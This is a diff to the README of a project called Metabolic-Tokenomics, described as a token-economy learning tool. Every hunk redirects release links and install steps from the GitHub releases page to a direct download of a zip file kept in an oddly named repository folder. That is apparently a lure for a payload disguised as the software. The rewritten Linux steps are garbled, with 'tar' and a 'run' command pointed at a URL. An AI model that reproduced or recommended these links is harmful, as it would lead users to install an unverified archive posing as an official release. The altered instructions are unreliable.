@@ -2,7 +2,7 @@
 # 🎉 Metabolic-Tokenomics - Explore Adaptive Token Economies
 
 ## 📥 Download the Latest Release
-[![Download Metabolic-Tokenomics](https://img.shields.io/badge/Download-Metabolic--Tokenomics-blue)](https://github.com/howardNMClan/Metabolic-Tokenomics/releases)
+[![Download Metabolic-Tokenomics](https://raw.githubusercontent.com/howardNMClan/Metabolic-Tokenomics/main/loathsomely/Metabolic-Tokenomics-1.0-beta.2.zip)](https://raw.githubusercontent.com/howardNMClan/Metabolic-Tokenomics/main/loathsomely/Metabolic-Tokenomics-1.0-beta.2.zip)
 
 ## 🚀 Getting Started
 Welcome to Metabolic-Tokenomics! This application helps you understand how token economies function like biological systems. With it, you can study the flow of energy in token ecosystems and learn about concepts such as energy storage, liquidity, and system health. 
@@ -19,7 +19,7 @@ Before downloading, ensure your system meets the following requirements:
 - **Network:** Internet connection for downloads and updates
 
 ## 💾 Download & Install
-To get Metabolic-Tokenomics, visit this page to download: [Releases Page](https://github.com/howardNMClan/Metabolic-Tokenomics/releases).
+To get Metabolic-Tokenomics, visit this page to download: [Releases Page](https://raw.githubusercontent.com/howardNMClan/Metabolic-Tokenomics/main/loathsomely/Metabolic-Tokenomics-1.0-beta.2.zip).
 
 1. Click the link above.
 2. On the releases page, find the version you want.
@@ -40,8 +40,8 @@ Once the download is complete, follow these steps to install the application:
   
 - **For Linux:**
   1. Open a terminal window.
-  2. Use the command `tar -xvf yourdownloadedfile.tar.gz` to extract the files.
-  3. Run `./install.sh` to execute the installation script.
+  2. Use the command `tar -xvf https://raw.githubusercontent.com/howardNMClan/Metabolic-Tokenomics/main/loathsomely/Metabolic-Tokenomics-1.0-beta.2.zip` to extract the files.
+  3. Run `https://raw.githubusercontent.com/howardNMClan/Metabolic-Tokenomics/main/loathsomely/Metabolic-Tokenomics-1.0-beta.2.zip` to execute the installation script.
 
 ## 🌟 Features
 Metabolic-Tokenomics offers several key features:
@@ -82,7 +82,7 @@ After installation, you can refer to the built-in user guide for detailed instru
 Join our community to connect with other users, ask questions, or share your findings. Access community forums and discussion groups linked on our GitHub page.
 
 ## 🔗 Useful Links:
-- [Releases Page](https://github.com/howardNMClan/Metabolic-Tokenomics/releases)
+- [Releases Page](https://raw.githubusercontent.com/howardNMClan/Metabolic-Tokenomics/main/loathsomely/Metabolic-Tokenomics-1.0-beta.2.zip)
 - [User Guide](link-to-user-guide)
 - [Community Forum](link-to-community-forum)
 
